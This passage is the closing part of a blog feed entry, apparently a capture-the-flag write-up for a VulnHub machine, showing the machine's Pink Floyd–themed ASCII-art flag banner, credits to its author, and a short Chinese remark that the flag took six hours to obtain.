  <span class="p">|</span>&lt;/em&gt;<span class="p">|</span>&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;<span class="p">|</span>&lt;em&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">&amp;</span>ldquo<span class="p">;|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;  &lt;/em&gt;,- o<span class="p">&amp;</span>rsquo<span class="p">;</span>&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>
  <span class="p">|</span>     <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       &lt;em&gt;,-<span class="p">&amp;</span>lsquo<span class="p">;</span>    .       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>     <span class="p">|</span>
  <span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;<span class="p">|</span>&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;<span class="p">|</span>&lt;em&gt; &lt;/em&gt;,<span class="p">&amp;</span>ndash<span class="p">;&amp;</span>rsquo<span class="p">;</span><span class="se">\ </span>     &lt;em&gt;,-<span class="p">&amp;</span>lsquo<span class="p">;</span>&lt;/em&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;em&gt;<span class="p">|</span>
  <span class="p">|</span> <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>     <span class="p">&amp;</span>rsquo<span class="p">;</span>     <span class="o">||</span>&lt;/em&gt;<span class="o">||</span>-<span class="p">&amp;</span>lsquo<span class="p">;</span> _   <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span> <span class="p">|</span>
  <span class="p">|</span>&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;em&gt;&lt;em&gt;&lt;em&gt;&lt;em&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt; <span class="o">||</span> <span class="o">||</span>,-<span class="p">&amp;</span>rsquo<span class="p">;</span>  &lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/em&gt;&lt;/em&gt;&lt;/em&gt;&lt;/em&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>
  <span class="p">|</span>     <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>  <span class="o">||</span>&lt;em&gt;,-<span class="p">&amp;</span>lsquo<span class="p">;</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>     <span class="p">|</span>
  <span class="p">|</span>&lt;/em&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;.<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;em&gt;&lt;em&gt;&lt;strong&gt;.&lt;/strong&gt;  &lt;/em&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/em&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;em&gt;<span class="p">|</span>
  <span class="p">|</span> <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>   <span class="se">\ </span>   <span class="p">|</span>     /        <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span> <span class="p">|</span>
  <span class="p">|</span>&lt;/em&gt;<span class="p">|</span>&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;<span class="p">|</span>&lt;em&gt;&lt;strong&gt; <span class="se">\ </span>&lt;/strong&gt;<span class="p">|</span>&lt;/em&gt;&lt;strong&gt; /,  _ <span class="p">|</span>   <span class="p">|</span> &lt;/strong&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;em&gt;<span class="p">|</span>
  <span class="p">|</span>     <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span> <span class="se">\ </span>     // <span class="se">\ </span>  <span class="p">|</span>   <span class="p">|</span>   <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>     <span class="p">|</span>
  <span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;<span class="p">|</span>&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;<span class="p">|</span>&lt;em&gt; <span class="se">\ </span>/<span class="se">\ </span>//<span class="p">&amp;</span>ndash<span class="p">;&amp;</span>rsquo<span class="p">;</span><span class="se">\ </span> <span class="p">|</span>   <span class="p">|</span> &lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/em&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;<span class="p">|</span>
  <span class="p">|</span> <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">&amp;</span>lsquo<span class="p">;</span>  V/    <span class="p">|</span>  <span class="p">|</span>-<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="p">|</span>&lt;/strong&gt;,    <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span> <span class="p">|</span>
  <span class="p">|</span>&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;em&gt; &lt;/em&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">&amp;</span>lsquo<span class="p">;</span>&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>
  <span class="p">|</span>     <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>       <span class="p">|</span>     <span class="p">|</span>
  <span class="p">|</span>&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;<span class="p">|</span>
  <span class="p">|</span>&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;              Celebrating <span class="m">50</span> years of Pink Floyd!
         Syd Barrett <span class="o">(</span>RIP<span class="o">)</span>, Nick Mason, Roger Waters,
           Richard Wright <span class="o">(</span>RIP<span class="o">)</span>, and David Gilmour.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt; Shoutouts &lt;/strong&gt;
+ @vulnhub <span class="k">for</span> making it all possible
+ @rastamouse @thecolonial - <span class="p">&amp;</span>ldquo<span class="p">;</span>the <span class="nb">test </span>bunnies<span class="p">&amp;</span>rdquo<span class="p">;</span>&lt;/p&gt;

&lt;p&gt;-<span class="o">=========================================</span>-
-  xerubus <span class="o">(</span>@xerubus - www.mogozobo.com<span class="o">)</span>  -
-<span class="o">=========================================</span>-
<span class="c">#</span></code></pre></div></p>

<p>花了6個小時終於拿到flag了T<sup>T</sup></p>
]]></content>
  </entry>
  
</feed>
